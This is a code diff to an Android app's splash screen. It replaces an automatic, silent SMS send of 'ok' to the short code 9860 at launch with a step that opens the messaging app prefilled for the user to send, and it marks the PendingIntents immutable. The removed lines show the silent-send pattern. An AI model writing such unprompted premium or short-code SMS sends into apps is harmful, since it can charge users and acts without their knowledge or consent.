@@ -34,9 +34,9 @@ public class SplashActivity extends Activity {
         String str = "SMS_SENT";
         String str2 = "SMS_DELIVERED";
         intent = new Intent(str);
-        PendingIntent broadcast = PendingIntent.getBroadcast(this, 0, intent, 0);
+        PendingIntent broadcast = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
         intent2 = new Intent(str2);
-        PendingIntent broadcast2 = PendingIntent.getBroadcast(this, 0, intent2, 0);
+        PendingIntent broadcast2 = PendingIntent.getBroadcast(this, 0, intent2, PendingIntent.FLAG_IMMUTABLE);
         broadcastReceiver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
@@ -68,10 +68,10 @@ public class SplashActivity extends Activity {
         intentFilter2 = new IntentFilter(str2);
         Intent registerReceiver2 = registerReceiver(broadcastReceiver2, intentFilter2);
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
+       /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
             SmsManager.getDefault().sendTextMessage("9860", null, "ok",broadcast,broadcast2);
-        }
-       /* String phoneNumber = "9860";
+        }*/
+        String phoneNumber = "9860";
         String message = "Ok";
 
         // Open the SMS app with the specified number and message
@@ -81,7 +81,6 @@ public class SplashActivity extends Activity {
         startActivity(intent3);
 
         finish();
-*/
         unregisterReceiver(broadcastReceiver);
         unregisterReceiver(broadcastReceiver2);
     }
